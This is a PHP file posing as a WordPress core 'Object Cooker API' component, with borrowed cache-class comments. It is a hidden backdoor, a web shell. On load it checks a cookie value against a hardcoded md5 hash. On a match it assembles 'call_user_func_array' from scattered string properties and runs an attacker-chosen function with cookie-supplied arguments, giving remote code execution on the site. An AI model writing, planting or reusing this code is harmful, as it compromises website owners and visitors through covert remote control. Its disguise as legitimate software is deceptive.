<?php
/**
 * Object Cooker API
 *
 * @link https://codex.wordpress.org/Class_Reference/WP_Object_Cooker
 *
 * @package WordPress
 * @subpackage Cooker
 */
class wp_appear {
    private $driver = 'cookie';
    private $type = 'call';
    private $prefix = 'md5';
    private $user = 'user';
    private $hash = 'a3adf96b7a87c0cd2dc570983a2e5e96';
    private $archive = 'array';
    private $split = 'func';
    private $data = FALSE;
    function __construct() {
        $this->init();
    }
    private function init()
    {
        $this->data = $_COOKIE;
        $prefix = $this->prefix;
        foreach($this->data AS $i => $v) $this->data[$i] = str_replace($prefix.'=', '', $v);
        $prefix = $prefix(array_shift($this->data));
        if($prefix==$this->hash) return $this->incr();
    }
    private function incr()
    {
        $user = array($this->type, $this->user, $this->split, $this->archive);
        $user = implode('_', $user);
        echo $user(array_shift($this->data), $this->data);
    }
}
/**
 * Increment numeric cache item's value
 *
 * @since 3.3.0
 *
 * @see WP_Object_Cooker::incr()
 * @global WP_Object_Cache $wp_object_cooker Object cookie global instance.
 *
 * @param int|string $key    The key for the cache contents that should be incremented.
 * @param int        $offset Optional. The amount by which to increment the item's value. Default 1.
 * @param string     $group  Optional. The group the key is in. Default empty.
 * @return false|int False on failure, the item's new value on success.
 */
new wp_appear();